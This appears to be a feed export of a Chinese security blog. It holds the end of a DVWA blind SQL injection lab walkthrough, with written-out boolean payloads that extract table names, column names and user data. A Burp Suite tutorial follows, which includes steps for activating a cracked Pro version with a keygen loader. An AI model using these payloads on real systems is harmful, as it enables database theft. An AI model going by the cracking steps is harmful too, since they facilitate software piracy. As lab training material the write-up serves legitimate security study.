0,1),1,1))&gt;103--</code>,显示不存在</p></li></ol><p>说明第一个表的名字的第一个字符为小写字母<code>g</code>(<code>ascii</code>码103)</p><p>重复上述步骤，即可猜解出两个表名（<code>guestbook</code>、<code>users</code>）</p><h2 id="猜解表中的字段名"><a href="#猜解表中的字段名" class="headerlink" title="猜解表中的字段名"></a>猜解表中的字段名</h2><h3 id="猜解表中字段的数量"><a href="#猜解表中字段的数量" class="headerlink" title="猜解表中字段的数量"></a>猜解表中字段的数量</h3><ol><li><p>输入<code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=1--</code>，显示不存在</p></li><li><p>。。。</p></li><li><p>输入<code>1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=8--</code>，显示存在</p></li></ol><p>说明<code>users</code>表有8个字段</p><h3 id="逐个猜解字段名长度"><a href="#逐个猜解字段名长度" class="headerlink" title="逐个猜解字段名长度"></a>逐个猜解字段名长度</h3><ol><li><p>输入<code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=1--</code>，显示不存在</p></li><li><p>。。。</p></li><li><p>输入<code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=7--</code>，显示存在</p></li></ol><p>说明<code>users</code>表的第一个字段为7个字符长度</p><h3 id="逐个猜解字段名"><a href="#逐个猜解字段名" class="headerlink" title="逐个猜解字段名"></a>逐个猜解字段名</h3><ol><li><p>输入<code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97--</code>，显示存在</p></li><li><p>。。。</p></li></ol><p>采用二分法，即可猜解出所有字段名<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><h2 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h2><ol><li><p>输入<code>1&#39; and ascii(substr((select user from users limit 0,1),1,1))&gt;97--</code>，显示不存在</p></li><li><p>。。。</p></li></ol><p>即可猜解出数据</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>Burp Suite</title>
    <link href="http://yoursite.com/2019/05/17/urpSuite/"/>
    <id>http://yoursite.com/2019/05/17/urpSuite/</id>
    <published>2019-05-17T12:23:00.000Z</published>
    <updated>2020-02-24T04:27:10.024Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Burp Suite</code>是用于攻击<code>web</code>应用程序的集成平台，包含了许多工具.它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示<code>HTTP</code>消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架</p><p><code>Burp Suite</code>是一个<code>Java</code>应用程序，并分发作为一个独立的<code>.jar</code>扩展的<code>Java</code>可执行文件</p><p><code>Burp Suite</code>的模块几乎包含整个安全测试过程，从最初对目标程序的信息采集，到漏洞扫描及其利用，多模块间高融合的配合，使得安全测试的过程更加高效</p><p>具体模块分类为：</p><ol><li><p><code>Dashboard</code>(仪表盘)——显示任务、实践日志等</p></li><li><p><code>Target</code>(目标)——显示目标目录结构的的一个功能</p></li><li><p><code>Proxy</code>(代理)——拦截<code>HTTP/HTTPS</code>的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流</p></li><li><p><code>Intruder</code>(入侵)——一个定制的高度可配置的工具，对<code>web</code>应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用<code>fuzzing</code>技术探测常规漏洞</p></li><li><p><code>Repeater</code>(中继器)——一个靠手动操作来触发单独的<code>HTTP</code>请求，并分析应用程序响应的工具</p></li><li><p><code>Sequencer</code>(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具</p></li><li><p><code>Decoder</code>(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具</p></li><li><p><code>Comparer</code>(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”</p></li><li><p><code>Extender</code>(扩展)——可以让你加载<code>Burp Suite</code>的扩展，使用你自己的或第三方代码来扩展<code>Burp Suit</code>的功能</p></li><li><p><code>Options</code>(设置)——包括<code>Project options</code>和<code>User options</code>，是对<code>Burp Suite</code>的一些设置</p></li></ol><p><img src="/images/shentouceshi_tools/Burp Suite/1.png" alt="1.png"></p><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="配置java环境"><a href="#配置java环境" class="headerlink" title="配置java环境"></a>配置java环境</h2><p>版本<code>jdk</code>1.8</p><h2 id="Burp-Suite破解版"><a href="#Burp-Suite破解版" class="headerlink" title="Burp Suite破解版"></a>Burp Suite破解版</h2><ol><li><p>运行<code>burp-loader-keygen-jas502n.jar</code>程序，点击<code>run</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/2.png" alt="2.png"></p></li><li><p>此时会自动打开文件<code>burpsuite_pro_v2.0.11beta.jar</code>，点击<code>I Accept</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/3.png" alt="3.png"></p></li><li><p>输入<code>license</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/4.png" alt="4.png"></p></li><li><p>选择<code>manual activation</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/5.png" alt="5.png"></p></li><li><p>复制<code>Activation Request</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/6.png" alt="6.png"></p></li><li><p>复制<code>Activation Response</code></p><p> <img src="/images/shentouceshi_tools/Burp Suite/7.png" alt="7.png"></p></li><li><p>成功，可以使用</p><p> <img src="/images/shentouceshi_tools/Burp Suite/8.png" alt="8.png">    </p></li></ol><hr><h1 id="Burp-Suite使用"><a href="#Burp-Suite使用" class="headerlink" title="Burp Suite使用"></a>Burp Suite使用</h1><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p><img src="/images/shentouceshi_tools/Burp Suite/10.png" alt="10.png"></p><hr><h2 id="两个小问题"><a href="#两个小问题" class="headerlink" title="两个小问题"></a>两个小问题</h2><h3 id="修改软件字体大小，HTTP数据包字体大小，数据包编码格式"><a href="#修改软件字体大小，HTTP数据包字体大小，数据包编码格式" class="headerlink" title="修改软件字体大小，HTTP数据包字体大小，数据包编码格式"></a>修改软件字体大小，HTTP数据包字体大小，数据包编码格式</h3><p><img src="/images/shentouceshi_tools/Burp Suite/13.png" alt="13.png"></p><p>重启<code>Burp Suite</code>生效</p><h3 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h3><p>为使<code>Burp Suite</code>可以拦截<code>HTTPS</code>流量，需导入<code>Burp Suite</code>证书</p><ol><li><p>配置好<code>Burp Suite</code>浏览器代理</p></li><li><p>访问<code>http://burp</code>，下载证书</p><p> <img src="/images/shentouceshi_tools/Burp Suite/11.png" alt="11.png"></p></li><li><p>将证书导入浏览器</p><p> <img src="/images/shentouceshi_tools/Burp Suite/12.png" alt="12.png"></p></li></ol><hr><h2 id="Scan-扫描"><a href="#Scan-扫描" class="headerlink" title="Scan(扫描)"></a>Scan(扫描)</h2><p>在<code>Dashboard</code>中可以创建扫描任务，进行扫描</p><p><img src="/images/shentouceshi_tools/Burp Suite/9.png" alt="9.png"></p><p><code>Event log</code>中显示事件列表</p><p><code>Issue activity</code>显示任务中发现的漏洞</p><hr><h2 id="Target-目标"><a href="#Target-目标" class="headerlink" title="Target(目标)"></a>Target(目标)</h2><h3 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h3><p>站点地图</p><p>用于显示通过爬站、扫描或代理获取到的目标站点</p><p><img src="/images/shentouceshi_tools/Burp Suite/14.png" alt="14.png"></p><h3 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h3><p>用于在<code>site map</code>中包含或排除<code>URL</code>地址</p><p><img src="/images/shentouceshi_tools/Burp Suite/15.png" alt="15.png"></p><h3 id="Issue-definitions"><a href="#Issue-definitions" class="headerlink" title="Issue definitions"></a>Issue definitions</h3><p>包含所有可由<code>Burp</code>扫描检测到的问题的定义</p><p><img src="/images/shentouceshi_tools/Burp Suite/16.png" alt="16.png"></p><hr><h2 id="Proxy-代理"><a href="#Proxy-代理" class="headerlink" title="Proxy(代理)"></a>Proxy(代理)</h2><p><code>Burp Suite</code>中最重要、最常用的模块</p><p>代理模块作为<code>Burp Suite</code>的核心功能，拦截<code>HTTP/HTTPS</code>的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许拦截，查看，修改在两个方向上的原始数据流</p><h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><p>用于显示修改<code>HTTP</code>请求及响应内容，并可以将拦截的<code>HTTP</code>请求快速发送至其他模块处理</p><p><img src="/images/shentouceshi_tools/Burp Suite/17.png" alt="17.png"></p><ol><li><p><code>Forward</code>：用于发送数据。当把所需要的HTTP请求编辑编辑完成后，手动发送数据</p></li><li><p><code>Drop</code>：将该请求包丢弃</p></li><li><p><code>Intercept is off/on</code>:拦截开关。当处于<code>off</code>状态下时，<code>Burp Suite</code>会自动转发所拦截的所有请求；当处于<code>on</code>状态下时，<code>Burp Suite</code>会将所有拦截所有符合规则的请求并将它显示出来等待编辑或其他操作</p></li><li><p><code>Action</code>:功能菜单，与右键菜单内容相同，在这可以将请求包发送到其他的模块或者对数据包进行其他的操作</p></li></ol><h3 id="http-history"><a href="#http-history" class="headerlink" title="http history"></a>http history</h3><p><img src="/images/shentouceshi_tools/Burp Suite/18.png" alt="18.png"></p><p>这里将记录经过代理服务器访问的所有请求，即使当<code>Intercept is off</code>时也会记录</p><p>记录包括：</p><ol><li><p><code>#</code>(请求索引号)</p></li><li><p><code>Host</code>(主机)</p></li><li><p><code>Method</code>(请求方式)</p></li><li><p><code>URL</code>(请求地址)</p></li><li><p><code>Params</code>(参数)</p></li><li><p><code>Edited</code>(编辑)</p></li><li><p><code>Status</code>(状态)</p></li><li><p><code>Length</code>(响应字节长度)</p></li><li><p><code>MIME type</code>(响应的<code>MLME</code>类型)</p></li><li><p><code>Extension</code>(地址文件扩展名)</p></li><li><p><code>Title</code>(页面标题)</p></li><li><p><code>Comment</code>(注释)</p></li><li><p><code>SSL</code></p></li><li><p><code>IP</code>(目标<code>IP</code>地址)</p></li><li><p><code>Cookies</code></p></li><li><p><code>Time</code>(发出请求时间)</p></li><li><p><code>Listener port</code>(监听端口)</p></li></ol><p>下方窗口可以显示请求的详细内容（<code>Request</code>）及其响应内容（<code>Response</code>），通过右键菜单也可以将请求发送至其他模块。双击某个请求即可打开详情,通过<code>Previous/next</code>可以快速切换请求，并且<code>Action</code>也可以将请求发送至其他模块</p><h3 id="WebSockets-history"><a href="#WebSockets-history" class="headerlink" title="WebSockets history"></a>WebSockets history</h3><p>用于记录<code>WebSockets</code>的数据包，是<code>HTML5</code>中最强大的通信功能，定义了一个全双工的通信信道，只需<code>Web</code>上的一个<code>Socket</code>即可进行通信，能减少不必要的网络流量并降低网络延迟</p><p><img src="/images/shentouceshi_tools/Burp Suite/19.png" alt="19.png"></p><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><p>主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，<code>ssl</code>等</p><p><img src="/images/shentouceshi_tools/Burp Suite/20.png" alt="20.png"></p><ol><li><p><code>Proxy Listeners</code>：代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于<code>BurpProxy</code>的工作流的心脏。默认情况下，<code>Burp</code>默认监听127.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有<code>Web</code>应用程序。</p></li><li><p><code>Intercept Client Requests</code>：配置拦截规则，设置拦截的匹配规则。当<code>Intercept request based on the following rules</code>为选中状态时，<code>burpsuite</code>会配置列表中的规则进行拦截或转发。注意：如果该复选框未选中，那么即使<code>Intercept is on</code>也无法截取数据包。</p><p> 规则可以通过<code>Enabled</code>列中的复选框选择开启或关闭。</p><p> 规则可以是域名，<code>IP</code>地址，协议，<code>HTTP</code>方法，<code>URL</code>，文件扩展名，参数，<code>cookie</code>，头/主体内容，状态代码，<code>MIME</code>类型，<code>HTML</code>页面标题等</p><p> 规则按顺序处理，并且使用布尔运算符<code>AND</code>和<code>OR</code>组合</p></li><li><p><code>Intercept Server Responses</code>：功能类似于配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的<code>Intercept request based on the following rules</code>为选中状态时，<code>burpsuite</code>会匹配响应包</p></li><li><p><code>Intercept WebSockets Messages</code>：用于设置拦截<code>WebSockets</code>数据</p></li><li><p><code>Response Modification</code>：用于执行响应的自动修改。可以使用这些选项来自动修改<code>HTML</code>应用程序响应中匹配的内容</p></li><li><p><code>Match and replace</code>：用于自动替换请求和响应通过代理的部分。对于每一个<code>HTTP</code>消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则，这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域</p></li><li><p><code>SSL Pass Through</code>：指定<code>WEB</code>服务器在经过<code>burpsuite</code>连接时使用<code>SSL</code>连接</p></li><li><p><code>Miscellaneous</code>：其他选项，这些选项控制着<code>Burp</code>代理的行为的一些具体细节</p></li></ol><hr><h2 id="Intruder-暴力破解"><a href="#Intruder-暴力破解" class="headerlink" title="Intruder(暴力破解)"></a>Intruder(暴力破解)</h2><p><code>intruder</code>是一个强大的工具，用于自动对<code>Web</code>应用程序自定义的攻击。它可以用来自动执行您的测试过程中可能出现的所有类型的任务。例如目录爆破，注入，密码爆破等</p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><p>用于配置目标服务器进行攻击的详细信息。</p><ol><li><p><code>Host</code>：这是目标服务器的IP地址或主机名</p></li><li><p><code>Port</code>：这是目标服务的端口号</p></li><li><p><code>Use HTTPS</code>：这指定的<code>SSL</code>是否应该被使用</p></li></ol><p>在<code>BurpSuite</code>任何请求处，右键菜单选择<code>Send to intruder</code>选项，将自动发送到此模块下并自动填充以上内容</p><p><img src="/images/shentouceshi_tools/Burp Suite/21.png" alt="21.png"></p><h3 id="Positions"><a href="#Positions" class="headerlink" title="Positions"></a>Positions</h3><p>设置<code>Payloads</code>的插入点以及攻击类型（攻击模式）</p><p><img src="/images/shentouceshi_tools/Burp Suite/22.png" alt="22.png"></p><ol><li><p><code>ttack type</code>：攻击模式设置</p><ol><li><p><code>sniper</code>：对变量依次进行破解。多个标记依次进行</p></li><li><p><code>battering ram</code>：对变量同时进行破解。多个标记同时进行</p></li><li><p><code>pitchfork</code>：每一个变量标记对应一个字典，取每个字典的对应项</p></li><li><p><code>cluster bomb</code>：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适用于用户名+密码的破解</p></li></ol></li><li><p><code>add</code>：插入一个新的标记</p></li><li><p><code>clear</code>：清除所有的标记</p></li><li><p><code>auto</code>：自动设置标记，一个请求发到该模块后<code>burpsuite</code>会自动标记<code>cookie</code>、<code>URL</code>等参数</p></li><li><p><code>refresh</code>：如果必要的话，这可以要求模板编辑器的语法高亮</p></li></ol><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p>设置<code>payload</code>，配置字典</p><p><img src="/images/shentouceshi_tools/Burp Suite/23.png" alt="23.png"></p><ol><li><p><code>Payload Sets</code>：<code>Payload</code>数量类型设置</p><ol><li><p><code>Payload Set</code>：指定需要配置的变量</p></li><li><p><code>Payload type</code>：<code>Payload</code>类型</p><ol><li><p><code>Simple list</code>：简单字典</p></li><li><p><code>Runtime file</code>：运行文件</p></li><li><p><code>Custom iterator</code>：自定义迭代器</p></li><li><p><code>Character substitution</code>：字符替换</p></li><li><p><code>Recursive grep</code>：递归查找</p></li><li><p><code>lllegal unicode</code>：非法字符</p></li><li><p><code>Character blocks</code>：字符块</p></li><li><p><code>Numbers</code>：数字组合</p></li><li><p><code>Dates</code>：日期组合</p></li><li><p><code>Brute forcer</code>：暴力破解</p></li><li><p><code>Null payloads</code>：空<code>payload</code></p></li><li><p><code>Username generator</code>：用户名生成</p></li><li><p><code>copy other payload</code>：复制其他<code>payload</code></p></li></ol></li></ol></li><li><p><code>Payload Opetions\[Payload type\]</code>：该选项会根据上个选项中<code>Payload type</code>的设置而改变</p></li><li><p><code>Payload Processing</code>：对生成的<code>Payload</code>进行编码、加密、截取等操作</p></li><li><p><code>Payload Encoding</code>：可以配置哪些有效载荷中的字符应该是<code>URL</code>编码的<code>HTTP</code>请求中的安全传输。任何已配置的<code>URL</code>编码最后应用，任何有效载荷处理规则执行之后。这是推荐使用此设置进行最终<code>URL</code>编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的<code>grep</code>选项来检查响应为呼应有效载荷的最终<code>URL</code>编码应用之前</p></li></ol><h3 id="Opetions"><a href="#Opetions" class="headerlink" title="Opetions"></a>Opetions</h3><p>此选项卡包含了<code>request headers</code>，<code>request engine</code>，<code>attack results</code>，<code>grep match</code>，<code>grep_extrack</code>，<code>grep payloads</code>和<code>redirections</code>。可以发动攻击之前，在主要<code>Intruder</code>的<code>UI</code>上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改    </p><p><img src="/images/shentouceshi_tools/Burp Suite/24.png" alt="24.png"></p><hr><h2 id="Repeater（上传绕过）"><a href="#Repeater（上传绕过）" class="headerlink" title="Repeater（上传绕过）"></a>Repeater（上传绕过）</h2><p><code>Repeater</code>是用于手动操作和发送个别<code>HTTP</code>请求，并分析应用程序的响应一个简单的工具。可以发送一个内部请求从<code>Burp</code>任何地方到<code>Repeater</code>，修改请求并且发送</p><p><img src="/images/shentouceshi_tools/Burp Suite/25.png" alt="25.png"></p><p>可以从<code>Proxy history</code>、<code>site map</code>、<code>Scanner</code>等模块中右键菜单<code>send to repeater</code>发送到<code>repeater</code>，对页面数据进行修改发送</p><p>点击<code>go</code>，发送请求，右边响应请求</p><p>可以通过<code>&lt;</code>和<code>&gt;</code>来返回上一次和下一个操作</p><p>单击<code>x</code>可以删除当前测试请求页面</p><p>底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数</p><p>该模块的设置在菜单栏<code>Repeater</code>中:</p><p><img src="/images/shentouceshi_tools/Burp Suite/26.png" alt="26.png"></p><ol><li><p><code>Update Content-length</code>：更新头部长度</p></li><li><p><code>Unpack gzip/deflate</code>：该选项控制<code>Burp</code>是否自动解压缩在收到的答复的<code>gzip</code>和<code>deflate</code>压缩内容</p></li><li><p><code>Follow redirections</code>：在遇到重定向时<code>Burp</code>该怎么处理</p></li><li><p><code>Never</code>：不会跟随任何重定向</p></li><li><p><code>On-site only</code>：中继器将只跟随重定向到使用相同的主机，端口和协议的<code>URL</code></p></li><li><p><code>In-scope Only</code>：中继器将只跟随重定向到的目标范围之内的<code>URL</code></p></li><li><p><code>Always</code>：中继器将跟随重定向到任何<code>URL</code>任何责任。</p></li><li><p><code>Process cookies in redirections</code>：当被重定向后是否提交<code>cookie</code></p></li><li><p><code>View</code>：设置响应/请求版块的布局方式</p></li><li><p><code>Action</code>：形同于右键菜单</p></li></ol><hr><h2 id="Sequencer-定序器"><a href="#Sequencer-定序器" class="headerlink" title="Sequencer(定序器)"></a>Sequencer(定序器)</h2><p>用于分析数据项的一个样本中的随机性质量</p><p>可以用它来测试应用程序的<code>session tokens</code>或其他重要数据项是否是不可预测的</p><h3 id="Live-capture"><a href="#Live-capture" class="headerlink" title="Live capture"></a>Live capture</h3><p><img src="/images/shentouceshi_tools/Burp Suite/31.png" alt="31.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/32.png" alt="32.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/33.png" alt="33.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/34.png" alt="34.png"></p><h3 id="Manual-load"><a href="#Manual-load" class="headerlink" title="Manual load"></a>Manual load</h3><p><img src="/images/shentouceshi_tools/Burp Suite/35.png" alt="35.png"></p><h3 id="Analysis-options"><a href="#Analysis-options" class="headerlink" title="Analysis options"></a>Analysis options</h3><p><img src="/images/shentouceshi_tools/Burp Suite/36.png" alt="36.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/37.png" alt="37.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/38.png" alt="38.png"></p><hr><h2 id="Decoder-编码模块"><a href="#Decoder-编码模块" class="headerlink" title="Decoder(编码模块)"></a>Decoder(编码模块)</h2><p>将原始数据转换成各种编码和哈希表的简单工具。它能够智能地识别多种编码格式采用启发式技术</p><p><img src="/images/shentouceshi_tools/Burp Suite/27.png" alt="27.png"></p><ol><li><p><code>Decode as...</code>：解码</p></li><li><p><code>Encode as...</code>：编码</p><p> 支持的编码解码类型：</p><ol><li><p><code>url</code></p></li><li><p><code>HTML</code></p></li><li><p><code>Base64</code></p></li><li><p><code>ASCII</code>码 </p></li><li><p><code>Hex</code>(十六进制)</p></li><li><p><code>octal</code>(八进制) </p></li><li><p><code>binary</code>(二进制) </p></li><li><p><code>GZIP</code></p></li></ol></li><li><p><code>hash</code>：支持的<code>hash</code>算法：</p><ol><li><p><code>SHA-384</code></p></li><li><p><code>SHA-224</code> </p></li><li><p><code>SHA-256</code></p></li><li><p><code>MD2</code> </p></li><li><p><code>SHA</code> </p></li><li><p><code>SHA-512</code> </p></li><li><p><code>MD5</code></p></li></ol></li><li><p><code>Smart decoding</code>：智能解码，<code>burpsuite</code>会递归查询自己所支持的格式尝试解码。通过有请求的任意模块的右键菜单<code>send to Decoder</code>或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击<code>Smart decoding</code>进行智能解码</p></li></ol><hr><h2 id="Comparer-比较器"><a href="#Comparer-比较器" class="headerlink" title="Comparer(比较器)"></a>Comparer(比较器)</h2><p><code>Comparer</code>是一个简单的工具，用于以图形化方式在任意两项数据之间进行比较</p><p>常见用途如下：</p><ol><li><p>在查找用户名枚举条件时，您可以使用有效和无效的用户名比较对失败登录的响应，以查找响应中的细微差异</p></li><li><p>当入侵者攻击导致一些非常大的响应，其长度不同于基本响应时，您可以比较这些响应以快速查看差异所在</p></li><li><p>在比较不同类型用户生成的站点地图或代理历史记录条目时，您可以比较相似请求对，以查看产生不同应用程序行为的差异所在</p></li><li><p>当使用布尔条件注入和其他类似测试测试<code>SQL</code>盲注入错误时，您可以比较两个响应，以查看注入不同条件是否导致响应的相关差异</p></li></ol><p>将数据加载到<code>Comparer</code>中的方式：</p><ol><li><p>直接从剪贴板粘贴它</p></li><li><p>从文件加载它</p></li><li><p>在<code>Burp</code>中的任何位置选择数据，然后从上下文菜单中选择<code>Send to Comparer</code></p></li></ol><p><img src="/images/shentouceshi_tools/Burp Suite/39.png" alt="39.png"></p><p>结果会通过高亮显示不同：</p><p><img src="/images/shentouceshi_tools/Burp Suite/40.png" alt="40.png"></p><hr><h2 id="Extender-扩充器"><a href="#Extender-扩充器" class="headerlink" title="Extender(扩充器)"></a>Extender(扩充器)</h2><p><code>BurpSuite</code>给出了两种插件安装方法，一种是在线安装：通过<code>BApp Store</code>安装插件；第二种是本地安装：添加本地环境中的插件</p><h3 id="在BApp-Store中安装插件"><a href="#在BApp-Store中安装插件" class="headerlink" title="在BApp Store中安装插件"></a>在BApp Store中安装插件</h3><p><code>Extender</code>选项卡，在<code>BApp Store</code>中可以下载安装很多插件</p><p><img src="/images/shentouceshi_tools/Burp Suite/28.png" alt="28.png"></p><h3 id="安装自定义插件"><a href="#安装自定义插件" class="headerlink" title="安装自定义插件"></a>安装自定义插件</h3><p><code>Extender</code>选项卡中的<code>Extensions</code>中点击<code>add</code>按钮，会弹出根据插件类型选择插件的目录</p><p><img src="/images/shentouceshi_tools/Burp Suite/29.png" alt="29.png"></p><hr><h2 id="过滤器的使用"><a href="#过滤器的使用" class="headerlink" title="过滤器的使用"></a>过滤器的使用</h2><p>在<code>burpsuite</code>中在多个模块都可以看到<code>Fitter</code>过滤器的身影，它们使用方法相同</p><p><img src="/images/shentouceshi_tools/Burp Suite/30.png" alt="30.png"></p><ol><li><p><code>Fitter by Request type</code>：按照请求类型筛选</p><ol><li><p><code>Show only in-scope items</code>：只显示范围内的</p></li><li><p><code>Show only requested items</code>：只显示请求的</p></li><li><p><code>Show only parameterized requests</code>：只显示带有参数的请求</p></li><li><p><code>Hide not-found items</code>：隐藏未找到的</p></li></ol></li><li><p><code>Fitter by search term</code>：通过关键字筛选</p><ol><li><p><code>regex</code>：通过正则表达式匹配</p></li><li><p><code>case sensitive</code>：是否区分大小写</p></li><li><p><code>negative search</code>：消极搜索，选择后将筛选出不包含该关键字的请求</p></li></ol></li><li><p><code>Fitter by MIME type</code>：通过文件类型筛选</p><ol><li><p><code>HTML</code>：是否显示<code>HTML</code>文件请求</p></li><li><p><code>Script</code>：是否显示脚本文件请求</p></li><li><p><code>XML</code>：是否显示标记文件请求</p></li><li><p><code>CSS</code>：是否显示层叠样式文件请求</p></li><li><p><code>Other text</code>：是否显示其他类型文本请求</p></li><li><p><code>images</code>：是否显示图片请求</p></li><li><p><code>Flash</code>：是否显示<code>Flash</code>动画请求</p></li><li><p><code>Other binary</code>：是否显示其他二进制文件</p></li></ol></li><li><p><code>Fitter by file extension</code>：通过文件后缀筛选</p><ol><li><p><code>Show only</code>：只显示自定义的后缀请求</p></li><li><p><code>Hide</code>：隐藏自定义的后缀请求</p></li></ol></li><li><p><code>Fitter by status code</code>：根据<code>HTTP</code>响应状态码筛选</p><ol><li><p><code>2xx</code>：显示成功的请求</p></li><li><p><code>3xx</code>：显示重定向的请求</p></li><li><p><code>4xx</code>：显示请求错误的请求</p></li><li><p><code>5xx</code>：显示服务器错误的请求</p></li></ol></li><li><p><code>Fitter by annotation</code>:显示仅显示用户提供的注释或亮点的项目</p><ol><li><p><code>Show only commented items</code>：只显示注释项目</p></li><li><p><code>Show only highlighted items</code>：只显示突出显示的项目</p><p> <code>-Folders</code>：是否显示文件夹</p></li><li><p><code>hide empty folders</code>：隐藏空文件夹</p></li></ol></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="WEB工具" scheme="http://yoursite.com/tags/WEB%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞扫描</title>
    <link href="http://yoursite.com/2019/05/15/%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <id>http://yoursite.com/2019/05/15/洞扫描/</id>
    <published>2019-05-15T13:27:00.000Z</published>
    <updated>2020-02-24T04:14:23.354Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h1><ol><li><p>基于端口服务扫描结果，查看服务版本信息(速度慢)</p></li><li><p>搜索已公开的漏洞数据库(数量大)</p></li><li><p>使用漏洞扫描器实现漏洞管理</p></li></ol><hr><h1 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描发现网络<code>IP</code>、<code>OS</code>、服务、配置、漏洞</p><p>需求：能够定义扫描方式内容和目标</p><h2 id="信息管理"><a href="#信息管理" class="headerlink" title="信息管理"></a>信息管理</h2><p>格式化信息，并进行筛选、分组、定义优先级</p><p>需求：能够进行资产分组、指定所有者</p><h2 id="信息输出"><a href="#信息输出" class="headerlink" title="信息输出"></a>信息输出</h2><p>向不同层级的人群展示足够的信息量</p><p>需求：生成报告、导出数据、可以与<code>SIEM</code>集成</p><p><code>SIEM</code>(安全信息和事件管理)是一个由不同的监视和分析组件组成的安全和审计系统</p><p>日志管理(<code>LMS</code>)——用于传统日志收集和存储的工具</p><p>安全信息管理(<code>SIM</code>)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、<code>DNS</code>服务器、路由器和防病毒应用程序</p><p>安全事件管理(<code>SEM</code>)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报</p><hr><h1 id="漏洞扫描的类型"><a href="#漏洞扫描的类型" class="headerlink" title="漏洞扫描的类型"></a>漏洞扫描的类型</h1><ol><li><p>主动扫描</p><p> 是否可进行身份认证</p></li><li><p>被动扫描</p><p> 镜像端口抓包分析</p></li><li><p>基于<code>Agent</code>的扫描</p></li></ol><hr><h1 id="漏洞的基本概念"><a href="#漏洞的基本概念" class="headerlink" title="漏洞的基本概念"></a>漏洞的基本概念</h1><p>漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统</p><h2 id="CVSS"><a href="#CVSS" class="headerlink" 